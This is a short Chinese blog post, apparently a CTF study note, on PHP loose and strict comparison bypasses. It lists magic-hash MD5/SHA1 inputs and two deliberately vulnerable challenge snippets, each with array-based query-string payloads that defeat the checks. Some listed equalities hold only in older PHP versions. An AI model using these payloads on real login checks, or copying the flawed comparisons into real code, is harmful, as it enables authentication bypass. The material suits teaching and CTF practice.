---
title: 关于php比较运算符
date: 2017-2-28
tags: php
---
# 比较运算符"=="与"==="的学习：

## 关于"=="的绕过：
0e开头的全部相等
栗子:
`md5('240610708') == md5('QNKCDZO')`
`md5('aabg7XSs') == md5('aabC9RqS')`
`sha1('aaroZmOk') == sha1('aaK1STfY')`
`sha1('aaO8zKZF') == sha1('aa3OFF9m')`
`'0010e2' == '1e3'`
`'0x1234Ab' == '1193131'`
`'0xABCdef' == '     0xABCdef'`
一道简单的CTF题目：
```php
<?php
$key = "llocdpocuzion5dcp2bindhspiccy";
$flag = strcmp($key, $_GET['key']);
if ($flag == 0) {
print "Welcome!";
} else {
print "Bad key!";
}
?>
```
payload:
`?key[]=1`

var_dump(strcmp( '', array())) => NULL ⇒ NULL == 0 ⇒ Get Flag！


## 关于“===”的绕过：
利用数组绕过

一道简单的CTF题目：
```php
if (isset($_GET['name']) and isset($_GET['password'])) {
	if ($_GET['name'] == $_GET['password'])
		print 'Your password can not be your name.';
	else if (sha1($_GET['name']) === sha1($_GET['password']))
		die('Flag: '.$flag);
```
payload:
`?name[]=1&password[]=2`

